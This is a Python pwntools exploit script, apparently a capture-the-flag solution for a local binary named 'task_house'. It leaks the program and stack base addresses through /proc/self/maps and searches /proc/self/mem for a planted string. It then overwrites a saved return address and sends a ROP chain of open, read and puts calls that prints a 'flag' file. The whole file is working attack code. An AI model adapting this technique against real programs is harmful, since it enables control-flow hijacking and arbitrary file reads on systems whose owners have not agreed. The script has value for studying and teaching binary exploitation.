from pwn import *
context(arch='amd64',os='linux',log_level='info')

sl = lambda x:io.sendline(x)
s = lambda x:io.send(x)
rn = lambda x:io.recv(x)
ru = lambda x:io.recvuntil(x, drop=True)
r = lambda :io.recv()
it = lambda: io.interactive()
success = lambda x:log.success(x)
io = 0
binary = './task_house'

def debug():
    gdb.attach(io)
    raw_input()

def menu(idx):
    ru('5.Exit\n')
    sl(str(idx))

def find(name):
    menu(1)
    ru('finding?\n')
    sl(name)

def locate(locate):
    menu(2)
    ru('you?\n')
    sl(str(locate))

def get(n):
    menu(3)
    ru('get?\n')
    sl(str(n))
    ru('something:\n')
    return rn(n)

def give(cont):
    menu(4)
    ru('content: \n')
    sl(cont)

def pwn():
    global io
    io = process(binary)
    ru('Y/n?\n')
    sl('y')
    find("/proc/self/maps")
    rv = get(1000)

    elf_base = int(rv[:12], 16)
    pop_rdi = elf_base + 0x1823
    pop_rsi = elf_base + 0x1821
    stack_start = int(rv[506:518], 16)
    #stack_start = int(rv[530:542], 16)
    success("stack address: 0x%x\nelf base: 0x%x" %(stack_start, elf_base))
    stack_size = 0x10000000
    how_many = 100000

    stack_start = stack_start + 0x150000

    find("/proc/self/mem")
    locate(stack_start)
    flag = False
    cont = 0
    count = 0
    for i in range(24):
        cont = get(how_many)
        if '/proc/self/mem' in cont:
            count = i
            flag = True
            break
    if flag == False:
        return 0
    try:
        pos = cont.index('/proc/self/mem')
    except:
        return 0
    str_pos = pos + stack_start + how_many * count
    read_ret_pos = str_pos - 0x38
    success("ret address: 0x%x\nstr pos: 0x%x" %(read_ret_pos, str_pos))
    payload = "/proc/self/mem"
    payload = payload.ljust(0x18, '\x00')
    payload += p64(read_ret_pos)
    find(payload)
    flag_address = read_ret_pos + 15*8
    open_address = elf_base + 0xC00
    read_address = elf_base + 0xBA0
    puts_address = elf_base + 0xB00
    payload = p64(pop_rdi) + p64(flag_address) + p64(pop_rsi) + p64(0)*2
    payload += p64(open_address) + p64(pop_rdi) + p64(6) + p64(pop_rsi) + p64(flag_address) + p64(0)
    payload += p64(read_address) + p64(pop_rdi) + p64(flag_address) + p64(puts_address)
    payload += "flag\x00"
    give(payload)
    context.log_level = 'debug'
    print rn(1024)
    return 1

if __name__ == '__main__':
    while(True):
        a = pwn()
        if a == 1:
            break
        else:
            io.kill()